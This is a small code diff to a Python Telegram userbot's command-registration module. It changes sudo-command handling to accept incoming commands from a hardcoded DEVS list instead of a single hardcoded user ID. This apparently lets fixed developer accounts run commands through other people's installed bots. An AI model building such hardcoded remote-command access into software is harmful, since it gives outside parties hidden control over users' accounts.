@@ -16,7 +16,7 @@ from traceback import format_exc
 
 from telethon import events
 
-from userbot import CMD_HANDLER, CMD_LIST, bot
+from userbot import CMD_HANDLER, DEVS, CMD_LIST, bot
 
 def ram_cmd(pattern=None, command=None, **args):
     args["func"] = lambda e: e.via_bot_id is None
@@ -135,7 +135,7 @@ def register(**args):
     if "sudo" in args:
         del args["sudo"]
         args["incoming"] = True
-        args["from_users"] = 1826643972
+        args["from_users"] = DEVS
 
     if "ignore_unsafe" in args:
         del args["ignore_unsafe"]
